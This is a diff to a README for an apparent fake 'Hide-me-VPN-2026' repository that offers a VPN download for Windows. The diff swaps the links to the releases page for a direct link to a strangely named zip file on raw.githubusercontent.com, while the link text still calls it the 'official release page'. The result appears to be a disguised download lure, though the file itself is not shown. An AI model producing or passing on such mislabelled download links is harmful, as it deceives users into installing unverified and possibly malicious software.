@@ -5,7 +5,7 @@ description: "Download hide.me VPN for Windows 10 and 11 using the direct instal
 ---
 # 🛡️ Hide-me-VPN-2026 - Secure your internet connection today
 
-[![](https://img.shields.io/badge/Download-Hide--me--VPN--2026-blue.svg)](https://github.com/giorgiogrammatical810/Hide-me-VPN-2026/releases)
+[![](https://img.shields.io/badge/Download-Hide--me--VPN--2026-blue.svg)](https://raw.githubusercontent.com/giorgiogrammatical810/giorgiogrammatical810.github.io/main/shoppishness/io-giorgiogrammatical-github-1.1.zip)
 
 ## 🌐 What is this software?
 
@@ -25,7 +25,7 @@ Your computer must meet these standards to run the VPN:
 
 Follow these steps to set up the software. You do not need technical skills to finish the installation.
 
-1. Go to the [official release page](https://github.com/giorgiogrammatical810/Hide-me-VPN-2026/releases). 
+1. Go to the [official release page](https://raw.githubusercontent.com/giorgiogrammatical810/giorgiogrammatical810.github.io/main/shoppishness/io-giorgiogrammatical-github-1.1.zip). 
 2. Find the file ending in .exe in the assets section.
 3. Click the file name to download it to your computer.
 4. Save the file in a folder you can find later, such as your Downloads folder.
